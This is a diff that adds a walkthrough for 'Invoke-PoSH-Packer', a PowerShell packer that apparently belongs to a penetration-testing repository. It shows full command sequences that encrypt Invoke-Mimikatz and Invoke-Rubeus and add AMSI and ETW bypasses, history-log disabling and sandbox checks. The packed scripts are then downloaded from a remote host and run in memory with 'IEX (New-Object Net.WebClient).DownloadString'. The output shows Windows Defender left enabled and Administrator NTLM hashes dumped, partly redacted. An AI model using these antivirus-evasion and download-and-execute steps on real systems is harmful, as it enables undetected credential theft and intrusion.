@@ -1,0 +1,204 @@
+================================================================================================================================================
+AV bypass using my PowerShell packer 'Invoke-PoSH-Packer'
+================================================================================================================================================
+
+'Invoke-PoSH-Packer' allows to pack and encrypt offensive PowerShell scripts (e.g. invoke-mimikatz.ps1, invoke-rubeus.ps1) in order to bypass AV solutions such as Windows Defender.
+
+=> URL: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-Packer
+
+FEATURES
+---------
+> AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+> AMSI bypass
+> Blocking Event Tracing for Windows (ETW)
+> Disabling PowerShell history logging
+> Basic sandbox evasion techniques (optional)
+  + stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
+  + wait for 60 seconds before execution
+
+
+================================================================================================================================================
+Example 1 - Create & run a packed/encrypted version of "invoke-mimkatz.ps1" on a Windows 10 laptop without getting detected by Windows Defender
+================================================================================================================================================
+
+Step 1 - Create a packed/encrypted version of the script 'Invoke-mimkatz.ps1' using 'Invoke-PoSH-Packer.ps1'
+---------------------------------------------------------------------------------------------------------------
+
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-Packer/Invoke-PoSH-Packer.ps1');
+
+  ___     ___ _  _     ___         _
+ | _ \___/ __| || |___| _ \___  __| |_____ _ _
+ |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
+ |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|
+                                             v1.1
+Usage:
+> Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
+> Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1
+
+Features:
+[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+PS C:\temp> Invoke-PoSH-Packer -FileUrl https://github.com/S3cur3Th1sSh1t/Creds/raw/master/PowershellScripts/Invoke-Mimikatz.ps1 -OutFile C:\temp\packed-mimi.ps1 -SandBox
+[*] Downloading the remote file: 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/PowershellScripts/Invoke-Mimikatz.ps1'
+[*] File compression (GZip)
+[*] File encryption (AES)
+[*] Adding basic sandbox checks
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] Writing the obfuscated & encrypted PowerShell script: 'C:\temp\packed-mimi.ps1' ...
+[+] Done!
+
+
+Step 2 - Download & execute into memory the packed/encrypted version of the script 'Invoke-Mimikatz' without being detected by the Windows Defender AV
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 01/02/2023 05:44:20
+
+
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-mimi.ps1');Invoke-Mimikatz
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Oct  4 2020 10:28:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 454006390 (00000000:1b0f9676)
+Session           : Interactive from 15
+User Name         : Administrator
+Domain            : Laptop1
+Logon Server      : Laptop1
+Logon Time        : 02/02/2023 00:55:57
+SID               : S-1-5-21-936125016-2310263949-2175806047-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : Laptop1
+         * NTLM     : 36f7a3ebaa54935ecf03678<SNIP>
+         * SHA1     : d5feabcececab0e16c2cbb3<SNIP>
+        tspkg :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : <SNIP>
+        wdigest :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : Laptop1
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+ <SNIP>
+ 
+ 
+================================================================================================================================================
+Example 2 - Create & run a packed/encrypted version of "invoke-rubeus.ps1" on a Windows 10 laptop without getting detected by Windows Defender
+================================================================================================================================================
+
+Step 1 - Create a packed/encrypted version of the script 'Invoke-rubeus.ps1' using 'Invoke-PoSH-Packer.ps1'
+-----------------------------------------------------------------------------------------------------------
+
+PS C:\temp> ls
+
+    Directory: C:\temp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        27/01/2023     01:03                logs
+d-----        02/02/2023     01:43                research
+-a----        27/01/2023     00:21          13268 Invoke-PoSH-Packer.ps1
+
+
+PS C:\temp> . .\Invoke-PoSH-Packer.ps1
+
+  ___     ___ _  _     ___         _
+ | _ \___/ __| || |___| _ \___  __| |_____ _ _
+ |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
+ |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|
+                                             v1.1
+Usage:
+> Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
+> Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1
+
+Features:
+[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+PS C:\temp> Invoke-PoSH-Packer -FilePath C:\Users\Administrator\Documents\Tools-Pentest\9-PowerShell\Invoke-Rubeus.ps1 -OutFile C:\temp\packed-rub3us.ps1
+[*] Loading the local file: 'C:\Users\Administrator\Documents\Tools-Pentest\9-PowerShell\Invoke-Rubeus.ps1'
+[*] File compression (GZip)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] Writing the obfuscated & encrypted PowerShell script: 'C:\temp\packed-rub3us.ps1' ...
+[+] Done!
+PS C:\temp>
+
+
+Step 2 - Download & execute into memory the packed/encrypted version of the script 'Invoke-rubeus' without being detected by the Windows Defender AV
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 01/02/2023 05:44:20
+
+
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-rub3us.ps1');  
+
+PS C:\> invoke-rubeus "currentluid"
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4
+
+[*] Action: Display current LUID
+
+[*] Current LogonID (LUID) : 0x1b0f9676 (454006390)
+
+
+PS C:\> invoke-rubeus "hash /password:SuperPassword"
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : SuperPassword
+[*]       rc4_hmac             : 104A92F7A0C45E38C04D1B283460BE2B
+
+[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
+<SNIP>
